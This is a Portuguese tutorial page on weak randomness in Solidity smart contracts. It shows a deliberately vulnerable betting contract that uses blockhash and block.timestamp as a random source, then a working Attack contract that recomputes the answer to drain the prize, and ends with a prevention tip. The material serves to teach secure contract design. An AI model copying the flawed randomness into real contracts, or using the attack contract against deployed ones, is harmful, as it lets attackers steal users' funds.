# Fonte de Aleatoriedade

#### Vulnerabilidade <a href="#vulnerability" id="vulnerability"></a>

`blockhash` e `block.timestamp` não são fontes confiáveis de ateatoriedade.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

/*
NOTA: não pode usar blockhash no Remix, então use ganache-cli

npm i -g ganache-cli
ganache-cli
No remix troque o ambiente para o provedor Web3
*/

/*
GuessTheRandomNumber é um jogo onde você ganha 1 Ether se você advinhar
um número pseudo aleatório gerado de um bloco de hash e timestamp.

À primeira vista, parece impossível advinhar o número correto.
Mas vamos ver como é fácil ganhar.

1. Alice implanta GuessTheRandomNumber com 1 Ether
2. Eve implementa Attack
3. Eve chama Attack.attack() e ganha 1 Ether

O que aconteceu?
Attack computou a resposta correta simplesmente copiando o código que computa 
o número aleatório
*/

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        guessTheRandomNumber.guess(answer);
    }

    // Função Helper para checar o balanço
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

#### Técnicas preventivas <a href="#preventative-techniques" id="preventative-techniques"></a>

* Não use `blockhash` e `block.timestamp` como fonte de aleatoriedade
